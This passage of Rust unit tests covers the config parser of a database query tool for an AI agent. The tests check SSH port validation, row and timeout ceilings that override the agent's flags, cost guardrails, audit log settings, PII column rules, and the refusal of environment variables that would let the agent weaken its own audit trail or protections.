            ConfigError::SshInvalid { .. }
        ));
        // Port 0 (host and remote) is rejected at parse (ssh refuses it).
        for ssh in [
            "host = \"bastion:0\"\nremote = \"db:5432\"",
            "host = \"bastion:22\"\nremote = \"db:0\"",
        ] {
            let text = format!(
                "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://u@h/db\"\n\
                 [connections.a.ssh]\n{ssh}"
            );
            assert!(
                matches!(
                    parse(&text, &env_of(&[])).unwrap_err(),
                    ConfigError::SshInvalid { .. }
                ),
                "port 0 must be rejected: {ssh}"
            );
        }
    }

    /// The ceilings the config owner can set on the agent's `--limit` /
    /// `--timeout`: the flag beats the config, but the ceiling beats the flag.
    #[test]
    fn ceilings_clamp_the_flag_the_config_and_the_built_in() {
        let cfg = |text: &str| parse(text, &env_of(&[])).unwrap();
        let plain = cfg("[connections.a]\nengine = \"sqlite\"\n");
        fn conn(c: &Config) -> &Connection {
            c.connections.get("a").unwrap()
        }
        // No ceiling anywhere: the historical resolution, unchanged.
        assert_eq!(plain.row_limit(conn(&plain), None), 1000);
        assert_eq!(plain.row_limit(conn(&plain), Some(5_000_000)), 5_000_000);
        assert_eq!(
            plain.timeout_secs(conn(&plain), Some(999_999_999)),
            999_999_999
        );

        // A ceiling in [defaults] applies to every connection...
        let d = cfg("[defaults]\nmax_row_limit = 100\nmax_timeout_secs = 5\n\
                    [connections.a]\nengine = \"sqlite\"\n");
        assert_eq!(d.row_limit(conn(&d), Some(5_000_000)), 100);
        assert_eq!(
            d.row_limit(conn(&d), Some(10)),
            10,
            "below the ceiling: the flag"
        );
        assert_eq!(
            d.row_limit(conn(&d), None),
            100,
            "the built-in 1000 is clamped too"
        );
        assert_eq!(d.timeout_secs(conn(&d), Some(999_999_999)), 5);
        assert_eq!(d.timeout_secs(conn(&d), None), 5);

        // ...and a per-connection ceiling overrides it — in either direction,
        // because it is the more specific statement of the same rule.
        let c = cfg("[defaults]\nmax_row_limit = 100\nmax_timeout_secs = 5\n\
                     [connections.a]\nengine = \"sqlite\"\nmax_row_limit = 10\n\
                     max_timeout_secs = 60\n");
        assert_eq!(c.row_limit(conn(&c), Some(5_000_000)), 10);
        assert_eq!(c.timeout_secs(conn(&c), Some(999)), 60);

        // A configured value ABOVE the ceiling is clamped as well: a
        // contradiction inside the config resolves the strict way.
        let x = cfg("[connections.a]\nengine = \"sqlite\"\nrow_limit = 900\n\
                     timeout_secs = 900\nmax_row_limit = 50\nmax_timeout_secs = 9\n");
        assert_eq!(x.row_limit(conn(&x), None), 50);
        assert_eq!(x.timeout_secs(conn(&x), None), 9);

        // Zero ceilings are the same footgun as zero limits: fail loud.
        for key in ["max_row_limit", "max_timeout_secs"] {
            for text in [
                format!("[defaults]\n{key} = 0"),
                format!("[connections.a]\nengine = \"sqlite\"\n{key} = 0"),
            ] {
                assert!(
                    matches!(
                        parse(&text, &env_of(&[])).unwrap_err(),
                        ConfigError::ZeroValue { .. }
                    ),
                    "{text}"
                );
            }
        }
    }

    #[test]
    fn guardrail_section_is_validated_against_the_engine() {
        // Parses and reaches the connection.
        let text = "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://u@h/db\"\n\
                    [connections.a.guardrail]\nmode = \"cost\"\nmax_cost = 250000.0";
        let cfg = parse(text, &env_of(&[])).unwrap();
        let g = cfg.connections["a"].guardrail.as_ref().unwrap();
        assert_eq!(g.mode.as_deref(), Some("cost"));
        assert_eq!(g.max_cost, Some(250_000.0));
        // A mode the engine cannot honor, an unknown mode and a threshold that
        // would refuse everything are all hard errors (exit 3) — never a silent
        // downgrade to "off".
        for (engine, body) in [
            ("sqlite", "mode = \"cost\""),
            ("sqlite", "mode = \"rows\""),
            ("mysql", "mode = \"cost\""),
            ("postgres", "mode = \"nope\""),
            ("postgres", "max_cost = 0.0"),
            ("mysql", "max_rows = 0"),
        ] {
            let text = format!(
                "[connections.a]\nengine = \"{engine}\"\npath = \"x.db\"\n\
                 url = \"mysql://u@h/db\"\n[connections.a.guardrail]\n{body}"
            );
            match parse(&text, &env_of(&[])).unwrap_err() {
                ConfigError::GuardrailInvalid { alias, message } => {
                    assert_eq!(alias, "a");
                    assert!(!message.is_empty(), "{engine}/{body}");
                }
                other => panic!("expected GuardrailInvalid for {engine}/{body}, got {other:?}"),
            }
        }
        // An explicit off is accepted everywhere, including sqlite.
        let text = "[connections.a]\nengine = \"sqlite\"\npath = \"x.db\"\n\
                    [connections.a.guardrail]\nmode = \"off\"";
        assert!(parse(text, &env_of(&[])).is_ok());
        // Unknown keys inside the section still fail loudly (the convention).
        let text = "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://u@h/db\"\n\
                    [connections.a.guardrail]\nmax_costs = 1.0";
        assert!(matches!(
            parse(text, &env_of(&[])).unwrap_err(),
            ConfigError::Invalid(_)
        ));
    }

    #[test]
    fn ssh_is_rejected_for_sqlite() {
        let text = "[connections.a]\nengine = \"sqlite\"\npath = \"./x.db\"\n\
                    [connections.a.ssh]\nhost = \"deploy@bastion:22\"\nremote = \"db:5432\"";
        match parse(text, &env_of(&[])).unwrap_err() {
            ConfigError::SshWithSqlite { alias } => assert_eq!(alias, "a"),
            other => panic!("expected SshWithSqlite, got {other:?}"),
        }
    }

    #[test]
    fn audit_defaults_on_and_parses_the_section() {
        // Absent [audit]: enabled, responses off.
        let cfg = parse("[connections.a]\nengine = \"sqlite\"\n", &env_of(&[])).unwrap();
        assert!(cfg.audit_enabled());
        assert!(!cfg.audit_log_responses());
        assert!(cfg.audit.path.is_none());
        // Explicit section.
        let cfg = parse(
            "[audit]\nenabled = false\npath = \"/var/log/nyet/audit.jsonl\"\nlog_responses = true\n\
             [connections.a]\nengine = \"sqlite\"\n",
            &env_of(&[]),
        )
        .unwrap();
        assert!(!cfg.audit_enabled());
        assert!(cfg.audit_log_responses());
        assert_eq!(cfg.audit.path.as_deref(), Some("/var/log/nyet/audit.jsonl"));
        // Unknown key inside [audit] fails loudly (the convention).
        assert!(matches!(
            parse("[audit]\ntypo = 1", &env_of(&[])).unwrap_err(),
            ConfigError::Invalid(_)
        ));
    }

    #[test]
    fn env_var_in_audit_path_is_rejected_literal_only() {
        // The agent controls the environment; ${VAR} in the audit path would let
        // it redirect or silence its own trail. Rejected before substitution, so
        // an unset variable fails too.
        for env in [env_of(&[("LOG", "/tmp/agent-owned")]), env_of(&[])] {
            let text = "[audit]\npath = \"${LOG}/audit.jsonl\"\n\
                        [connections.a]\nengine = \"sqlite\"\n";
            match parse(text, &env).unwrap_err() {
                ConfigError::AuditPathEnvVar { value } => {
                    assert_eq!(value, "${LOG}/audit.jsonl")
                }
                other => panic!("expected AuditPathEnvVar, got {other:?}"),
            }
        }
        // A literal path is fine.
        assert!(parse(
            "[audit]\npath = \"/var/log/nyet/audit.jsonl\"\n[connections.a]\nengine = \"sqlite\"\n",
            &env_of(&[])
        )
        .is_ok());
    }

    #[test]
    fn pii_section_parses_and_bad_rules_fail_loud() {
        // The section reaches the connection and resolves to real rules.
        let text = "[connections.a]\nengine = \"postgres\"\nurl = \"postgres://u@h/db\"\n\
                    [connections.a.pii]\ncolumns = [\"users.email\", \"app.customers.ssn\"]";
        let cfg = parse(text, &env_of(&[])).unwrap();
        let rules = pii("a", &cfg.connections["a"]).unwrap();
        assert!(rules.protects("users", "email"));
        assert!(rules.protects("customers", "ssn"));
        assert!(!rules.protects("users", "id"));

        // Quoted identifiers work: the way psql/pg_dump print a name, and the
        // only way to name a column that CANNOT be written unquoted. The AST
        // hands over the value without quotes, so matching lines up.
        let text = "[connections.a]\nengine = \"sqlite\"\npath = \"x.db\"\n\
                    [connections.a.pii]\ncolumns = ['\"users\".\"e-mail\"', '\"user data\".x']";
        let cfg = parse(text, &env_of(&[])).unwrap();
        let rules = pii("a", &cfg.connections["a"]).unwrap();
        assert!(rules.protects("users", "e-mail"));
        assert!(rules.protects("user data", "x"));

        // No section, and an explicitly empty list, both mean "no policy" —
        // the historical behavior, byte for byte (UX-5).
        for body in ["", "[connections.a.pii]\ncolumns = []"] {
            let text = format!("[connections.a]\nengine = \"sqlite\"\npath = \"x.db\"\n{body}");
            let cfg = parse(&text, &env_of(&[])).unwrap();
            assert!(
                pii("a", &cfg.connections["a"]).unwrap().is_empty(),
                "{body}"
            );
        }

        // A rule nyet cannot parse — or accepts but could never MATCH — would
        // silently protect nothing while the owner believes it is protected.
        // Both shapes below were reproduced returning the value on exit 0.
        for rule in [
            "email",
            "users.",
            ".email",
            "a.b.c.d",
            "",
            // half-quoted / quote in the middle is neither an identifier nor a
            // quoted name
            "\"users.email\"",
            "\"users.email",
            "us\"ers.email",
            // a whole list crammed into one string (one forgotten comma)
            "users.email, users.phone",
            // stray syntax that can never be an identifier
            "users.email;",
            "users.*",
            "users email",
        ] {
            // TOML literal string ('...'): the rules under test contain quotes.
            let text = format!(
                "[connections.a]\nengine = \"sqlite\"\npath = \"x.db\"\n\
                 [connections.a.pii]\ncolumns = ['{rule}']"
            );
            match parse(&text, &env_of(&[])).unwrap_err() {
                ConfigError::PiiRuleInvalid { alias, message } => {
                    assert_eq!(alias, "a");
                    assert!(message.contains("table.column"), "{rule}: {message}");
                }
                other => panic!("expected PiiRuleInvalid for {rule:?}, got {other:?}"),
            }
        }

        // Unknown keys inside the section fail loudly (the convention).
        let text = "[connections.a]\nengine = \"sqlite\"\npath = \"x.db\"\n\
                    [connections.a.pii]\ncolumn = [\"users.email\"]";
        assert!(matches!(
            parse(text, &env_of(&[])).unwrap_err(),
            ConfigError::Invalid(_)
        ));
    }

    #[test]
    fn pii_mode_parses_and_a_bad_one_fails_loud() {
        let with = |body: &str| {
            format!(
                "[connections.a]\nengine = \"sqlite\"\npath = \"x.db\"\n\
                 [connections.a.pii]\ncolumns = [\"users.email\"]\n{body}"
            )
        };
        // Absent = deny, byte for byte the pre-PII-2 behavior (UX-5).
        let cfg = parse(&with(""), &env_of(&[])).unwrap();
        assert_eq!(
            pii("a", &cfg.connections["a"]).unwrap().mode(),
            crate::validator::PiiMode::Deny
        );
        for (value, want) in [
            ("deny", crate::validator::PiiMode::Deny),
            ("mask", crate::validator::PiiMode::Mask),
        ] {
            let cfg = parse(&with(&format!("mode = \"{value}\"")), &env_of(&[])).unwrap();
            assert_eq!(pii("a", &cfg.connections["a"]).unwrap().mode(), want);
        }
        // A typo must not silently pick either sanction (Д3): loud, with the
        // two accepted values in the message.
        for bad in ["Mask", "redact", "off", ""] {
            let text = with(&format!("mode = \"{bad}\""));
            match parse(&text, &env_of(&[])).unwrap_err() {
                ConfigError::PiiRuleInvalid { alias, message } => {
                    assert_eq!(alias, "a");
                    assert!(message.contains("mask"), "{bad}: {message}");
                    assert!(message.contains("deny"), "{bad}: {message}");
                }
                other => panic!("expected PiiRuleInvalid for mode {bad:?}, got {other:?}"),
            }
        }
        // A mode with no columns protects nothing while reading as if it did.
        let text = "[connections.a]\nengine = \"sqlite\"\npath = \"x.db\"\n\
                    [connections.a.pii]\nmode = \"mask\"";
        match parse(text, &env_of(&[])).unwrap_err() {
            ConfigError::PiiRuleInvalid { message, .. } => {
                assert!(message.contains("columns is empty"), "{message}");
            }
            other => panic!("expected PiiRuleInvalid, got {other:?}"),
        }
        // ${VAR} is rejected here too: the agent owns the environment and would
        // otherwise switch its own sanction.
        let text = "[connections.a]\nengine = \"sqlite\"\npath = \"x.db\"\n\
                    [connections.a.pii]\ncolumns = [\"users.email\"]\nmode = \"${M}\"";
        match parse(text, &env_of(&[("M", "mask")])).unwrap_err() {
            ConfigError::EnvVarInPolicy { alias, key, .. } => {
                assert_eq!(alias, "a");
                assert_eq!(key, "pii.mode");
            }
            other => panic!("expected EnvVarInPolicy(pii.mode), got {other:?}"),
        }
    }

    #[test]
    fn env_var_in_pii_columns_is_rejected_literal_only() {
        // Same class as allowed_dirs / allow_functions / guardrail.mode: the
        // agent owns the environment, so ${VAR} here would let it unprotect its
        // own target. Rejected BEFORE substitution, so an unset var fails too.
        for env in [env_of(&[("C", "users.email")]), env_of(&[])] {
            let text = "[connections.a]\nengine = \"sqlite\"\npath = \"x.db\"\n\
                        [connections.a.pii]\ncolumns = [\"${C}\"]";
            match parse(text, &env).unwrap_err() {
                ConfigError::EnvVarInPolicy { alias, key, .. } => {
                    assert_eq!(alias, "a");
                    assert_eq!(key, "pii.columns");
                }
                other => panic!("expected EnvVarInPolicy(pii.columns), got {other:?}"),
            }
        }
    }

    #[test]
    fn permissions_warning_on_group_other_bits() {
        assert!(permissions_warning(0o100600, "config file").is_none());
        assert!(permissions_warning(0o100644, "config file").is_some());
        assert!(permissions_warning(0o100640, "config file").is_some());
        assert!(permissions_warning(0o100601, "config file").is_some());
        // The label is interpolated, so the same check serves the audit log.
        assert!(permissions_warning(0o100644, "the audit log")
            .unwrap()
            .contains("audit log"));
    }
}
